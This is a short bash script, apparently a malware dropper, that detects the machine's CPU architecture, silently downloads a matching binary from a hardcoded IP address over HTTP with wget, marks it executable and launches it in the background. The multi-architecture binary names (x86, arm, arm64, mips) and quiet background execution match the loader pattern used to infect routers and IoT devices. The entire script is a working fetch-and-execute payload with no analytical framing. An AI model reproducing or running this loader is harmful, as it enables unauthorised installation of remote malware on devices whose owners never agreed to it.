#!/bin/bash

SERVER_IP="80.97.124.196"

# 1. Detect the system architecture
ARCH=$(uname -m)
echo "System detected as: $ARCH"

# 2. Map the system architecture to your binary names
case "$ARCH" in
    x86_64)  BIN="x86" ;;
    i386|i686) BIN="x86_32" ;;
    armv7l|armv6l) BIN="arm" ;;
    aarch64) BIN="arm64" ;;
    mips)    BIN="mips" ;;
    *)       BIN="x86" ;; # Default to x86 if unknown
esac

echo "Selected binary: $BIN"

# 3. Clean up, Download, and Execute
rm -f "$BIN"
wget -q "http://$SERVER_IP/$BIN" -O "$BIN"

if [ -f "$BIN" ]; then
    chmod +x "$BIN"
    echo "Executing $BIN..."
    ./"$BIN" &
    echo "Process started in background."
else
    echo "Error: Binary $BIN not found on server."
    exit 1
fi
